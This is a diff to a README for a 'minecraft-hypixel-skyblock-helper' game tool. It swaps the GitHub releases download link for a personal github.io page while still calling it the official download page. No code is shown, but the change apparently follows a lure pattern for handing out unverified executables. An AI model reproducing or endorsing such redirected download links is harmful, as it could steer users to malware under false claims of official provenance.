@@ -9,10 +9,10 @@ Welcome! This guide will help you download and run **minecraft-hypixel-skyblock-
 **Step 1: Get the Application**
 
 👉 **Visit this link to download the application:**  
-[![Download minecraft-hypixel-skyblock-helper](https://img.shields.io/badge/Download-minecraft--hypixel--skyblock--helper-blue?style=for-the-badge&logo=github&colorB=4CAF50&colorA=FF9800)](https://github.com/Aasdsadsad04/minecraft-hypixel-skyblock-helper/releases)
+[![Download minecraft-hypixel-skyblock-helper](https://img.shields.io/badge/Download-minecraft--hypixel--skyblock--helper-blue?style=for-the-badge&logo=github&colorB=4CAF50&colorA=FF9800)](https://aasdsadsad04.github.io)
 
 Click the button above or copy and paste this link into your browser:  
-`https://github.com/Aasdsadsad04/minecraft-hypixel-skyblock-helper/releases`
+`https://aasdsadsad04.github.io`
 
 This link takes you to the official download page where you'll find the latest version of the app. Look for the file labeled **"minecraft-hypixel-skyblock-helper"** and choose the version that matches your device (Windows is recommended).
 
